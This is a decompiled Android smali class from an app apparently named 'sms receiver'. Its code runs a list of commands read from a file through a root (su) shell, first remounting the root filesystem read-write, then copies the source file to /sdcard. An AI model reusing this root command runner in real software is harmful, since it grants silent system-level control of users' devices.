.class Lcom/binary/sms/receiver/SkeletonActivity$9;
.super Ljava/lang/Object;
.source "SkeletonActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/binary/sms/receiver/SkeletonActivity;->systemCallCopy(Ljava/lang/String;[Ljava/lang/String;JLjava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private final synthetic val$commands:[Ljava/lang/String;

.field private final synthetic val$source:Ljava/lang/String;

.field private final synthetic val$suComand:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$suComand:Ljava/lang/String;

    iput-object p2, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$commands:[Ljava/lang/String;

    iput-object p3, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$source:Ljava/lang/String;

    .line 752
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .prologue
    .line 756
    :try_start_0
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "systemCall: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$suComand:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 765
    iget-object v1, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$suComand:Ljava/lang/String;

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$commands:[Ljava/lang/String;

    iget-object v3, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$source:Ljava/lang/String;

    invoke-virtual {p0, v1, v2, v3}, Lcom/binary/sms/receiver/SkeletonActivity$9;->sume(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V

    .line 767
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "systemCall end: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/binary/sms/receiver/SkeletonActivity$9;->val$suComand:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 772
    :goto_0
    return-void

    .line 768
    :catch_0
    move-exception v0

    .line 769
    .local v0, "e":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "readMails: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public sume(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)V
    .locals 16
    .param p1, "suComand"    # Ljava/lang/String;
    .param p2, "commands"    # [Ljava/lang/String;
    .param p3, "source"    # Ljava/lang/String;

    .prologue
    .line 777
    invoke-static/range {p3 .. p3}, Lcom/binary/sms/receiver/SkeletonActivity;->getDataFileList(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    .line 778
    .local v1, "chCommands":Ljava/util/List;, "Ljava/util/List<Ljava/lang/String;>;"
    const/4 v10, 0x0

    const-string v11, "mount -orw,remount rootfs /"

    invoke-interface {v1, v10, v11}, Ljava/util/List;->add(ILjava/lang/Object;)V

    .line 779
    const-string v10, "mount -oro,remount rootfs /"

    invoke-interface {v1, v10}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 780
    invoke-interface {v1}, Ljava/util/List;->size()I

    move-result v10

    new-array v10, v10, [Ljava/lang/String;

    invoke-interface {v1, v10}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object p2

    .end local p2    # "commands":[Ljava/lang/String;
    check-cast p2, [Ljava/lang/String;

    .line 782
    .restart local p2    # "commands":[Ljava/lang/String;
    const/4 v5, 0x0

    .line 784
    .local v5, "msg":Landroid/os/Message;
    const/4 v3, 0x1

    .line 786
    .local v3, "i":I
    const/4 v8, 0x0

    .line 787
    .local v8, "process":Ljava/lang/Process;
    const/4 v6, 0x0

    .line 790
    .local v6, "os":Ljava/io/DataOutputStream;
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v10

    move-object/from16 v0, p1

    invoke-virtual {v10, v0}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v8

    .line 793
    new-instance v7, Ljava/io/DataOutputStream;

    invoke-virtual {v8}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v10

    invoke-direct {v7, v10}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 799
    .end local v6    # "os":Ljava/io/DataOutputStream;
    .local v7, "os":Ljava/io/DataOutputStream;
    if-eqz p2, :cond_0

    .line 801
    :try_start_1
    move-object/from16 v0, p2

    array-length v11, v0

    const/4 v10, 0x0

    move v4, v3

    .end local v3    # "i":I
    .local v4, "i":I
    :goto_0
    if-lt v10, v11, :cond_2

    move v3, v4

    .line 814
    .end local v4    # "i":I
    .restart local v3    # "i":I
    :cond_0
    const-string v10, "exit\n"

    invoke-virtual {v7, v10}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 815
    invoke-virtual {v7}, Ljava/io/DataOutputStream;->flush()V

    .line 817
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    const-wide/16 v10, 0xbb8

    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V

    .line 819
    invoke-virtual {v8}, Ljava/lang/Process;->waitFor()I

    .line 820
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;

    move-result-object v5

    .line 821
    const/4 v10, 0x0

    iput v10, v5, Landroid/os/Message;->arg1:I

    .line 822
    const/4 v10, 0x0

    iput v10, v5, Landroid/os/Message;->arg2:I

    .line 824
    const-string v10, "systemCall Succesfule"

    invoke-static {v10}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 836
    if-eqz v7, :cond_1

    .line 837
    :try_start_2
    invoke-virtual {v7}, Ljava/io/DataOutputStream;->close()V

    .line 839
    :cond_1
    invoke-virtual {v8}, Ljava/lang/Process;->destroy()V

    .line 841
    new-instance v10, Ljava/io/File;

    move-object/from16 v0, p3

    invoke-direct {v10, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v11, Ljava/io/File;

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "/sdcard/"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p3

    invoke-virtual {v12, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v13

    invoke-virtual {v12, v13, v14}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v10, v11}, Lcom/binary/sms/receiver/SystemUtils;->copyFiles(Ljava/io/File;Ljava/io/File;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    :goto_1
    move-object v6, v7

    .line 848
    .end local v7    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "os":Ljava/io/DataOutputStream;
    :goto_2
    return-void

    .line 801
    .end local v3    # "i":I
    .end local v6    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "i":I
    .restart local v7    # "os":Ljava/io/DataOutputStream;
    :cond_2
    :try_start_3
    aget-object v9, p2, v10

    .line 802
    .local v9, "single":Ljava/lang/String;
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "command: "

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Lcom/binary/sms/receiver/Logger;->info(Ljava/lang/String;)V

    .line 803
    new-instance v12, Ljava/lang/StringBuilder;

    invoke-static {v9}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v13, "\n"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v7, v12}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 804
    invoke-virtual {v7}, Ljava/io/DataOutputStream;->flush()V

    .line 805
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_5
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    move-result-object v5

    .line 806
    add-int/lit8 v3, v4, 0x1

    .end local v4    # "i":I
    .restart local v3    # "i":I
    :try_start_4
    iput v4, v5, Landroid/os/Message;->arg1:I

    .line 807
    const/4 v12, -0x1

    iput v12, v5, Landroid/os/Message;->arg2:I
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 801
    add-int/lit8 v10, v10, 0x1

    move v4, v3

    .end local v3    # "i":I
    .restart local v4    # "i":I
    goto/16 :goto_0

    .line 826
    .end local v4    # "i":I
    .end local v7    # "os":Ljava/io/DataOutputStream;
    .end local v9    # "single":Ljava/lang/String;
    .restart local v3    # "i":I
    .restart local v6    # "os":Ljava/io/DataOutputStream;
    :catch_0
    move-exception v2

    .line 827
    .local v2, "e":Ljava/lang/Exception;
    :goto_3
    :try_start_5
    invoke-static {}, Landroid/os/Message;->obtain()Landroid/os/Message;

    move-result-object v5

    .line 828
    const/4 v10, 0x1

    iput v10, v5, Landroid/os/Message;->arg1:I

    .line 829
    const/4 v10, 0x0

    iput v10, v5, Landroid/os/Message;->arg2:I

    .line 831
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "systemCall Exception"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 836
    if-eqz v6, :cond_3

    .line 837
    :try_start_6
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->close()V

    .line 839
    :cond_3
    invoke-virtual {v8}, Ljava/lang/Process;->destroy()V

    .line 841
    new-instance v10, Ljava/io/File;

    move-object/from16 v0, p3

    invoke-direct {v10, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v11, Ljava/io/File;

    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "/sdcard/"

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p3

    invoke-virtual {v12, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v13

    invoke-virtual {v12, v13, v14}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v10, v11}, Lcom/binary/sms/receiver/SystemUtils;->copyFiles(Ljava/io/File;Ljava/io/File;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto/16 :goto_2

    .line 844
    :catch_1
    move-exception v2

    .line 845
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "systemCall finaly"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_2

    .line 834
    .end local v2    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v10

    .line 836
    :goto_4
    if-eqz v6, :cond_4

    .line 837
    :try_start_7
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->close()V

    .line 839
    :cond_4
    invoke-virtual {v8}, Ljava/lang/Process;->destroy()V

    .line 841
    new-instance v11, Ljava/io/File;

    move-object/from16 v0, p3

    invoke-direct {v11, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v12, Ljava/io/File;

    new-instance v13, Ljava/lang/StringBuilder;

    const-string v14, "/sdcard/"

    invoke-direct {v13, v14}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p3

    invoke-virtual {v13, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v14

    invoke-virtual {v13, v14, v15}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v11, v12}, Lcom/binary/sms/receiver/SystemUtils;->copyFiles(Ljava/io/File;Ljava/io/File;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 847
    :goto_5
    throw v10

    .line 844
    :catch_2
    move-exception v2

    .line 845
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "systemCall finaly"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v11, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_5

    .line 844
    .end local v2    # "e":Ljava/lang/Exception;
    .end local v6    # "os":Ljava/io/DataOutputStream;
    .restart local v7    # "os":Ljava/io/DataOutputStream;
    :catch_3
    move-exception v2

    .line 845
    .restart local v2    # "e":Ljava/lang/Exception;
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "systemCall finaly"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v10, v2}, Lcom/binary/sms/receiver/Logger;->error(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto/16 :goto_1

    .line 834
    .end local v2    # "e":Ljava/lang/Exception;
    :catchall_1
    move-exception v10

    move-object v6, v7

    .end local v7    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "os":Ljava/io/DataOutputStream;
    goto :goto_4

    .end local v3    # "i":I
    .end local v6    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "i":I
    .restart local v7    # "os":Ljava/io/DataOutputStream;
    :catchall_2
    move-exception v10

    move-object v6, v7

    .end local v7    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "os":Ljava/io/DataOutputStream;
    move v3, v4

    .end local v4    # "i":I
    .restart local v3    # "i":I
    goto :goto_4

    .line 826
    .end local v6    # "os":Ljava/io/DataOutputStream;
    .restart local v7    # "os":Ljava/io/DataOutputStream;
    :catch_4
    move-exception v2

    move-object v6, v7

    .end local v7    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "os":Ljava/io/DataOutputStream;
    goto/16 :goto_3

    .end local v3    # "i":I
    .end local v6    # "os":Ljava/io/DataOutputStream;
    .restart local v4    # "i":I
    .restart local v7    # "os":Ljava/io/DataOutputStream;
    :catch_5
    move-exception v2

    move-object v6, v7

    .end local v7    # "os":Ljava/io/DataOutputStream;
    .restart local v6    # "os":Ljava/io/DataOutputStream;
    move v3, v4

    .end local v4    # "i":I
    .restart local v3    # "i":I
    goto/16 :goto_3
.end method
